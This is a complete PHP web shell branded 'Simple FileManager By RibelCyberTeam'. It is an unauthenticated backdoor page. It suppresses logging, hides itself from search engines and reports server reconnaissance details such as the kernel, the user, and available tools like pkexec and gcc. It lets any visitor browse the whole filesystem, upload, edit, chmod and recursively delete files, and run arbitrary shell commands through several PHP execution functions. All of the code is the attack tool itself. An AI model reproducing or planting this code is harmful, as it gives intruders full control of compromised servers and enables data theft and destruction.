<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow">
    <meta name="description" content="Simple FileManager By RibelCyberTeam">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="icon" href="https://backlinkku.id/images/icon/kurakura.png" type="image/png">
    <title>Simple FileManager By RibelCyberTeam</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
</head>
<style>
    .table-dark {
        background-color: #343a40;
        color: white;
    }
    .table-dark th, .table-dark td {
        border: 1px solid #666;
    }
    .table-dark th {
        background-color: #23272b;
    }
    .table-dark tbody tr:hover {
        background-color: #454d55;
    }
</style>
<body class="bg-dark text-white">
    <div class="container mt-5">
        <a href="?" class="text-decoration-none text-white">
            <h1 class="mb-4 text-center">Simple FileManager By RibelCyberTeam</h1>
        </a>
        <?php
        error_reporting(0);
        @clearstatcache();
        set_time_limit(0);
        @ini_set('error_log',null);
        @ini_set('log_errors',0);
        @ini_set('max_execution_time',0);
        @ini_set('output_buffering',0);
        @ini_set('display_errors', 0);
        @ini_set('disable_functions', 0);
        session_start();
        date_default_timezone_set("Asia/Jakarta");
        $green = "<span style='color: green;'>ON</span>";
        $red = "<span style='color: red;'>OFF</span>";
        $sql = (extension_loaded('mysql') || function_exists('mysql_connect')) ? $green : $red;
        $curl = (extension_loaded('curl')) ? $green : $red;
        $wget = (is_executable('/usr/bin/wget') || is_executable('/bin/wget')) ? $green : $red;
        $pl = (is_executable('/usr/bin/perl') || is_executable('/bin/perl')) ? $green : $red;
        $py = (is_executable('/usr/bin/python') || is_executable('/bin/python')) ? $green : $red;
        $pxex = (is_executable('/usr/bin/pkexec') || is_executable('/bin/pkexec')) ? $green : $red;
        $gcc = (is_executable('/usr/bin/gcc') || is_executable('/bin/gcc')) ? $green : $red;   
        $disfunc = @ini_get("disable_functions");
        $kernel = php_uname();
        $phpver = PHP_VERSION;
        $phpos = PHP_OS;
        $domen = $_SERVER["SERVER_NAME"];
        $soft = $_SERVER["SERVER_SOFTWARE"];
        $ip = gethostbyname($_SERVER['HTTP_HOST']);
        if (empty($disfunc)) {
            $disfc = "<gr>NONE</gr>";
        } else {
            $disfc = "<rd>$disfunc</rd>";
        }
        if (!function_exists('posix_getegid')) {
            $user = @get_current_user();
            $uid = @getmyuid();
            $gid = @getmygid();
            $group = "?";
        } else {
            $uid = @posix_getpwuid(posix_geteuid());
            $gid = @posix_getgrgid(posix_getegid());
            $user = $uid['name'];
            $uid = $uid['uid'];
            $group = $gid['name'];
            $gid = $gid['gid'];
        }        
        $sm = (@ini_get(strtolower("safe_mode")) == 'on') ? "<rd>ON</rd>" : "<gr>OFF</gr>";
        echo "<div>
                    System: <gr>$kernel</gr><br>
                    User: <gr>$user</gr> ($uid) | Group: <gr>$group</gr> ($gid)<br>
                    PHP Version: <gr>$phpver</gr> | OS: <gr>$phpos</gr><br>
                    Software: <gr>$soft</gr><br>
                    Domain: <gr>$domen</gr><br>
                    Server IP: <gr>$ip</gr><br>
                    Safe Mode: $sm<br>
                    MySQL: $sql | Perl: $pl | WGET: $wget | CURL: $curl | Python: $py | Pkexec: $pxex | GCC: $gcc<br>
                    Disable Function: <br><pre>$disfc</pre>
                </div>";
        function hex($n) {
            $y = '';
            for ($i = 0; $i < strlen($n); $i++) {
                $y .= dechex(ord($n[$i]));
            }
            return $y;
        }
        function unhex($y) {
            $n = '';
            for ($i = 0; $i < strlen($y) - 1; $i += 2) {
                $n .= chr(hexdec($y[$i] . $y[$i + 1]));
            }
            return $n;
        }
        // Menampilkan daftar file dan direktori
        function listDirectory($path) {
            $directories = [];
            $files = [];
            if (is_dir($path)) {
                $items = array_diff(scandir($path), ['.', '..']);
                foreach ($items as $item) {
                    $fullPath = $path . DIRECTORY_SEPARATOR . $item;
                    if (is_dir($fullPath)) {
                        $directories[] = $item;
                    } else {
                        $files[] = $item;
                    }
                }
            } else {
                echo "Path tidak valid atau bukan direktori.";
                return false;
            }
            return ['directories' => $directories, 'files' => $files];
        }
        function formatSize($size)
        {
            if ($size >= 1073741824) {
                return number_format($size / 1073741824, 2) . ' GB';
            } elseif ($size >= 1048576) {
                return number_format($size / 1048576, 2) . ' MB';
            } elseif ($size >= 1024) {
                return number_format($size / 1024, 2) . ' KB';
            } else {
                return $size . ' bytes';
            }
        }
        $path = isset($_GET['path']) ? unhex($_GET['path']) : getcwd();
        if (!is_dir($path)) {
            die("Path tidak valid atau bukan direktori.");
        }
        $path = str_replace("\\", "/", $path);
        $directoriesAndFiles = listDirectory($path);
        $paths = explode("/", $path);
        echo "<nav aria-label='breadcrumb'>
                <ol class='breadcrumb bg-dark p-0'>
                    <li class='breadcrumb-item'>PATH: <a href='?path=" . hex('/') . "'>Root</a></li>";
        foreach ($paths as $index => $part) {
            if ($part) {
                echo "<li class='breadcrumb-item'><a href='?path=" . hex(implode("/", array_slice($paths, 0, $index + 1))) . "'>$part</a></li>";
            }
        }
        echo "</ol></nav>";
        echo "<div class='row'>";
        // Menampilkan header keterangan
        echo "<div class='container mt-4'>
                <form method='post' enctype='multipart/form-data' class='bg-dark p-3 rounded'>
                    <input type='file' name='fileToUpload' class='form-control mb-2'>
                    <button type='submit' name='upload' class='btn btn-success w-100'>Upload</button>
                </form>
              </div>";
        if (isset($_POST['upload'])) {
            if (isset($_FILES['fileToUpload'])) {
                $uploadFile = $path . DIRECTORY_SEPARATOR . basename($_FILES['fileToUpload']['name']);
                if (move_uploaded_file($_FILES['fileToUpload']['tmp_name'], $uploadFile)) {
                    echo "<script>alert('File berhasil di-upload.');</script>";
                } else {
                    echo "<script>alert('Gagal meng-upload file.');</script>";
                }
            }
        }
        // Menampilkan header untuk file/folder
        echo "<div class='mb-4'>
                <h4>List Direktori dan File</h4>
                <div class='table-responsive'>
                    <table class='table table-bordered table-striped table-dark'>
                        <thead>
                            <tr>
                                <th>File/Folder</th>
                                <th>File Size</th>
                                <th>Modify</th>
                                <th>Owner/Group</th>
                                <th>Permission</th>
                                <th>Action</th>
                            </tr>
                        </thead>
                        <tbody>";
        // Menampilkan daftar direktori terlebih dahulu
        foreach ($directoriesAndFiles['directories'] as $item) {
            $itemPath = $path . DIRECTORY_SEPARATOR . $item;
            $icon = '<a href="?path=' . hex($itemPath) . '" class="text-decoration-none text-white"><i class="fas fa-folder"></i></a>';
            $sizeLabel = '-';
            $nameLink = '<a href="?path=' . hex($itemPath) . '" class="text-decoration-none text-white">' . $item . '</a>';
            echo "<tr>
                    <td>$icon $nameLink</td>
                    <td>$sizeLabel</td>
                    <td>" . date('Y-m-d H:i:s', filemtime($itemPath)) . "</td>
                    <td>" . fileowner($itemPath) . "/" . filegroup($itemPath) . "</td>
                    <td>" . substr(sprintf('%o', fileperms($itemPath)), -4) . "</td>
                    <td>
                        <div class='btn-group'>
                            <a href='?path=" . hex($itemPath) . "' class='btn btn-info btn-sm' title='Lihat'>
                                <i class='fas fa-eye'></i>
                            </a>
                            <a href='?renameFolder=" . hex($itemPath) . "' class='btn btn-primary btn-sm' title='Rename'>
                                <i class='fas fa-pen'></i>
                            </a>
                            <a href='?chmodFolder=" . hex($itemPath) . "' class='btn btn-secondary btn-sm' title='Chmod'>
                                <i class='fas fa-lock'></i>
                            </a>
                            <a href='?deleteFolder=" . hex($itemPath) . "' class='btn btn-danger btn-sm' title='Hapus'>
                                <i class='fas fa-trash'></i>
                            </a>
                        </div>
                    </td>
                  </tr>";
        }
        // Menampilkan daftar file setelah direktori
        foreach ($directoriesAndFiles['files'] as $item) {
            $itemPath = $path . DIRECTORY_SEPARATOR . $item;
            $icon = '<a href="?view=' . hex($itemPath) . '" class="text-decoration-none text-white"><i class="fas fa-file-alt"></i></a>';
            $sizeLabel = formatSize(filesize($itemPath));
            $nameLink = '<a href="?view=' . hex($itemPath) . '" class="text-decoration-none text-white">' . $item . '</a>';
            echo "<tr>
                    <td>$icon $nameLink</td>
                    <td>$sizeLabel</td>
                    <td>" . date('Y-m-d H:i:s', filemtime($itemPath)) . "</td>
                    <td>" . fileowner($itemPath) . "/" . filegroup($itemPath) . "</td>
                    <td>" . substr(sprintf('%o', fileperms($itemPath)), -4) . "</td>
                    <td>
                        <div class='btn-group'>
                            <a href='?view=" . hex($itemPath) . "' class='btn btn-info btn-sm' title='Lihat'>
                                <i class='fas fa-eye'></i>
                            </a>
                            <a href='?edit=" . hex($itemPath) . "' class='btn btn-warning btn-sm' title='Edit'>
                                <i class='fas fa-edit'></i>
                            </a>
                            <a href='?rename=" . hex($itemPath) . "' class='btn btn-primary btn-sm' title='Rename'>
                                <i class='fas fa-pen'></i>
                            </a>
                            <a href='?chmod=" . hex($itemPath) . "' class='btn btn-secondary btn-sm' title='Chmod'>
                                <i class='fas fa-lock'></i>
                            </a>
                            <a href='?delete=" . hex($itemPath) . "' class='btn btn-danger btn-sm' title='Hapus'>
                                <i class='fas fa-trash'></i>
                            </a>
                        </div>
                    </td>
                  </tr>";
        }
        echo "</tbody></table><p>Create By <a href=\"https://t.me/RibelCyberTeam\" target=\"_blank\">Ribel</a><img src=\"https://bot.backlinkku.id/verified.gif\" width=\"17\" height=\"17\" alt=\"Verified\"></p></div></div>";
        // Menghandle view file
        if (isset($_GET['view'])) {
            $file = unhex($_GET['view']);
            if (is_file($file)) {
                $content = file_get_contents($file);
                echo "<div class='mt-4'>
                        <h3>Isi File: " . basename($file) . "</h3>
                        <pre class='bg-dark p-3'>" . htmlspecialchars($content) . "</pre>
                      </div>";
            }
        }
        // Menghandle edit file
        if (isset($_GET['edit'])) {
            $file = unhex($_GET['edit']);
            if (is_file($file)) {
                if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['content'])) {
                    $handle = fopen($file, 'w');
                    if ($handle) {
                        fwrite($handle, $_POST['content']);
                        fclose($handle);
                        echo "<script>alert('File berhasil disimpan.'); window.location.href='?path=" . hex(dirname($file)) . "';</script>";
                    } else {
                        echo "<script>alert('Gagal membuka file untuk ditulis.');</script>";
                    }
                }
                $content = file_get_contents($file);
                echo "<div class='mt-4'>
                        <h3>Edit File: " . basename($file) . "</h3>
                        <form method='post'>
                            <textarea name='content' class='form-control' rows='10'>" . htmlspecialchars($content) . "</textarea><br>
                            <button type='submit' class='btn btn-primary'>Simpan</button>
                            <a href='?path=" . hex(dirname($file)) . "' class='btn btn-secondary'>Batal</a>
                        </form>
                    </div>";
            }
        }
        // Menghandle rename file
        if (isset($_GET['rename'])) {
            $file = unhex($_GET['rename']);
            if (is_file($file)) {
                if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['new_name'])) {
                    $newName = trim($_POST['new_name']);
                    $directory = dirname($file);
                    $newFilePath = $directory . DIRECTORY_SEPARATOR . $newName;
                    if (!empty($newName) && !file_exists($newFilePath)) {
                        if (rename($file, $newFilePath)) {
                            echo "<script>alert('File berhasil di-rename.'); window.location.href='?path=" . hex($directory) . "';</script>";
                            exit;
                        } else {
                            echo "<script>alert('Gagal rename file.');</script>";
                        }
                    } else {
                        echo "<script>alert('Nama file baru tidak valid atau file sudah ada.');</script>";
                    }
                }
                $currentName = basename($file);
                echo "<div class='mt-4'>
                        <h3>Rename File: " . htmlspecialchars($currentName) . "</h3>
                        <form method='post'>
                            <input type='text' name='new_name' class='form-control' value='" . htmlspecialchars($currentName) . "'><br>
                            <button type='submit' class='btn btn-primary'>Ganti Nama</button>
                            <a href='?path=" . hex(dirname($file)) . "' class='btn btn-secondary'>Batal</a>
                        </form>
                    </div>";
            } else {
                echo "<script>alert('File tidak ditemukan.'); window.location.href='?path=" . hex(dirname($file)) . "';</script>";
            }
        }
        // Menghandle chmod file
        if (isset($_GET['chmod'])) {  
            $file = unhex($_GET['chmod']);
            if (is_file($file)) {
                if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['permissions'])) {
                    $permissions = $_POST['permissions'];
                    chmod($file, octdec($permissions));
                    echo "<script>alert('Permissions berhasil diubah.'); window.location.href='?path=" . hex(dirname($file)) . "';</script>";
                }
                $currentPermissions = substr(sprintf('%o', fileperms($file)), -4);
                echo "<div class='mt-4'>
                        <h3>Chmod File: " . basename($file) . "</h3>
                        <form method='post'>
                            <input type='text' name='permissions' class='form-control' value='" . $currentPermissions . "'><br>
                            <button type='submit' class='btn btn-primary'>Set Permissions</button>
                            <a href='?path=" . hex(dirname($file)) . "' class='btn btn-secondary'>Batal</a>
                        </form>
                    </div>";
            }
        }
        // Menghapus file
        if (isset($_GET['delete'])) {
            $file = unhex($_GET['delete']);
            if (is_file($file)) {
                unlink($file);
                echo "<script>alert('File berhasil dihapus.'); window.location.href='?path=" . hex(dirname($file)) . "';</script>";
            } elseif (is_dir($file)) {
                rmdir($file);
                echo "<script>alert('Folder berhasil dihapus.'); window.location.href='?path=" . hex(dirname($file)) . "';</script>";
            }
        }
        // Renaming Folder (Directory)
        if (isset($_GET['renameFolder'])) {
            $folder = unhex($_GET['renameFolder']);
            if (is_dir($folder)) {
                if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['new_name'])) {
                    $newName = $_POST['new_name'];
                    $newPath = dirname($folder) . DIRECTORY_SEPARATOR . $newName;
                    if (rename($folder, $newPath)) {
                        echo "<script>alert('Folder berhasil di-rename.'); window.location='?path=" . hex(dirname($folder)) . "';</script>";
                    } else {
                        echo "<script>alert('Gagal rename folder.');</script>";
                    }
                }
                $currentName = basename($folder);
                echo "<div class='mt-4'>
                        <h3>Rename Folder: " . $currentName . "</h3>
                        <form method='post'>
                            <input type='text' name='new_name' class='form-control' value='" . $currentName . "'><br>
                            <button type='submit' class='btn btn-primary'>Ganti Nama</button>
                            <a href='?path=" . hex(dirname($folder)) . "' class='btn btn-secondary'>Batal</a>
                        </form>
                    </div>";
            } else {
                echo "<script>alert('Folder tidak ditemukan.'); window.location='?path=" . hex(dirname($folder)) . "';</script>";
            }
        }
        // Chmod Folder (Directory)
        if (isset($_GET['chmodFolder'])) {
            $folder = unhex($_GET['chmodFolder']);
            if (is_dir($folder)) {
                if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['permissions'])) {
                    $permissions = $_POST['permissions'];
                    // Apply chmod to the folder
                    if (chmod($folder, octdec($permissions))) {
                        echo "<script>alert('Permissions folder berhasil diubah.'); window.location='?path=" . hex(dirname($folder)) . "';</script>";
                    } else {
                        echo "<script>alert('Gagal mengubah permissions folder.');</script>";
                    }
                }
                $currentPermissions = substr(sprintf('%o', fileperms($folder)), -4);
                echo "<div class='mt-4'>
                        <h3>Chmod Folder: " . basename($folder) . "</h3>
                        <form method='post'>
                            <input type='text' name='permissions' class='form-control' value='" . $currentPermissions . "'><br>
                            <button type='submit' class='btn btn-primary'>Set Permissions</button>
                            <a href='?path=" . hex(dirname($folder)) . "' class='btn btn-secondary'>Batal</a>
                        </form>
                    </div>";
            } else {
                echo "<script>alert('Folder tidak ditemukan.'); window.location='?path=" . hex(dirname($folder)) . "';</script>";
            }
        }
        // Delete Folder (Directory)
        if (isset($_GET['deleteFolder'])) {
            $folder = unhex($_GET['deleteFolder']);
            if (is_dir($folder)) {
                function deleteFolder($dir) {
                    $files = array_diff(scandir($dir), array('.', '..'));
                    foreach ($files as $file) {
                        $filePath = $dir . DIRECTORY_SEPARATOR . $file;
                        if (is_dir($filePath)) {
                            deleteFolder($filePath);
                        } else {
                            unlink($filePath);
                        }
                    }
                    rmdir($dir);
                }
                deleteFolder($folder);
                echo "<script>alert('Folder dan isinya berhasil dihapus.'); window.location='?path=" . hex(dirname($folder)) . "';</script>";
            } else {
                echo "<script>alert('Folder tidak ditemukan.'); window.location='?path=" . hex(dirname($folder)) . "';</script>";
            }
        }
        // CMD sesuai dengan direktori di URL
        if (isset($_POST['cmd'])) {
            $cmd = $_POST['cmd'];
            $path = isset($_GET['path']) ? unhex($_GET['path']) : getcwd();
            chdir($path);
            echo "<div class='mt-4'>";
            $output = '';
            $resultCode = 1;
            if (function_exists('system')) {
                @ob_start();
                @system($cmd, $resultCode);
                $output = @ob_get_contents();
                @ob_end_clean();
                if (!empty($output)) {
                    echo "<pre>Result Code: $resultCode</pre>";
                    echo "<pre>" . htmlspecialchars($output, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8') . "</pre>";
                    echo "</div>";
                }
            }
            else if (function_exists('exec')) {
                $results = [];
                @exec($cmd, $results, $resultCode);
                if (!empty($results)) {
                    $output = implode("\n", $results);
                    echo "<pre>Result Code: $resultCode</pre>";
                    echo "<pre>" . htmlspecialchars($output, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8') . "</pre>";
                    echo "</div>";
                }
            }
            else if (function_exists('passthru')) {
                @ob_start();
                @passthru($cmd, $resultCode);
                $output = @ob_get_contents();
                @ob_end_clean();
                if (!empty($output)) {
                    echo "<pre>Result Code: $resultCode</pre>";
                    echo "<pre>" . htmlspecialchars($output, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8') . "</pre>";
                    echo "</div>";
                }
            }
            else if (function_exists('proc_open')) {
                $descriptorspec = [
                    0 => ["pipe", "r"],
                    1 => ["pipe", "w"],
                    2 => ["pipe", "w"]
                ];
                $process = @proc_open($cmd, $descriptorspec, $pipes);
                if (is_resource($process)) {
                    $output = @stream_get_contents($pipes[1]);
                    @fclose($pipes[0]);
                    @fclose($pipes[1]);
                    @fclose($pipes[2]);
                    $resultCode = @proc_close($process);
                    if (!empty($output)) {
                        echo "<pre>Result Code: $resultCode</pre>";
                        echo "<pre>" . htmlspecialchars($output, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8') . "</pre>";
                        echo "</div>";
                    }
                }
            }
            else if (function_exists('shell_exec')) {
                $output = @shell_exec($cmd);
                $resultCode = ($output === null) ? 1 : 0;
                if (!empty($output)) {
                    echo "<pre>Result Code: $resultCode</pre>";
                    echo "<pre>" . htmlspecialchars($output, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8') . "</pre>";
                    echo "</div>";
                }
            }
            else {
                echo "<pre>Result Code: $resultCode</pre>";
                echo "<pre>$output</pre>";
                echo "</div>";
            }
        }
        // Create a new file
        if (isset($_POST['createFile'])) {
            $fileName = $_POST['fileName'];
            $path = dirname(__FILE__) . DIRECTORY_SEPARATOR . $fileName;
            if (touch($path)) {
                echo "<script>alert('File berhasil dibuat.'); window.location='?path=" . hex(dirname($path)) . "';</script>";
            } else {
                echo "<script>alert('Gagal membuat file.');</script>";
            }
        }
        // Create a new folder
        if (isset($_POST['createFolder'])) {
            $folderName = $_POST['folderName'];
            $path = dirname(__FILE__) . DIRECTORY_SEPARATOR . $folderName;
            if (mkdir($path)) {
                echo "<script>alert('Folder berhasil dibuat.'); window.location='?path=" . hex(dirname($path)) . "';</script>";
            } else {
                echo "<script>alert('Gagal membuat folder.');</script>";
            }
        }
                ?>
        <div class='container-fluid'>
			<div class='corner anu py-3'>
				<button class='btn btn-outline-light btn-sm' data-bs-toggle='collapse' data-bs-target='#collapseExample' aria-expanded='false' aria-controls='collapseExample'>
				<i class='bi bi-info-circle'></i> [CMD] - [Create File] - [Create Folder] <i class='bi bi-chevron-down'></i>
				</button>
			</div>
			<div class='collapse text-dark mb-3' id='collapseExample'>
				<div class='box shadow bg-light p-3 rounded-3'>
                <div class="mt-4">
            <h3>Run Shell Command</h3>
            <form method="POST">
                <input type="text" name="cmd" class="form-control" placeholder="Enter shell command" required>
                <button type="submit" class="btn btn-primary mt-2">Run Command</button>
            </form>
        </div>
        <!-- Form for creating a file -->
        <div class="mt-4">
            <h3>Create a New File</h3>
            <form method="POST">
                <input type="text" name="fileName" class="form-control" placeholder="Enter file name" required>
                <button type="submit" name="createFile" class="btn btn-primary mt-2">Create File</button>
            </form>
        </div>
        <!-- Form for creating a folder -->
        <div class="mt-4">
            <h3>Create a New Folder</h3>
            <form method="POST">
                <input type="text" name="folderName" class="form-control" placeholder="Enter folder name" required>
                <button type="submit" name="createFolder" class="btn btn-primary mt-2">Create Folder</button>
            </form>
        </div>
    </div>
    <!-- Script Bootstrap dan FontAwesome -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
